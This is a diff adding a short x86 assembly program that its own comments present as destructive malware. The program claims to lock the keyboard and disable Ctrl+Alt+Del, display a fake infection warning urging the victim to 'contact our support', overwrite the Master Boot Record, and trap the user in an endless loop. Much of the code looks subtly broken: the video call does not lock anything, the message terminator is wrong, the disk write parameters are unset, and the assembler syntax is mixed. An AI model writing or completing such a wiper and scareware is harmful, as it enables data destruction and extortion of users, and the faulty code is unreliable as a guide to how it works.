@@ -1,0 +1,30 @@
+; E
+
+ORG 100h
+
+start:
+    ; Lock the keyboard and disable Ctrl+Alt+Del
+    mov ax, 0x4F03
+    xor bx, bx
+    int 0x10
+
+    ; Display a deceptive message on the screen
+    mov ah, 9
+    mov dx, offset message
+    int 21h
+
+    ; Perform a destructive action: overwrite the Master Boot Record (MBR)
+    mov dl, 0
+    mov ah, 3
+    mov al, 1
+    xor ch, ch
+    xor dh, dh
+    int 13h
+
+    ; Infinite loop to prevent the user from escaping
+    jmp $
+
+message db "Warning: Your computer is infected with a devastating virus. All data will be destroyed. Contact our support for help!", 0
+
+times 510-($-$$) db 0
+dw 0AA55h
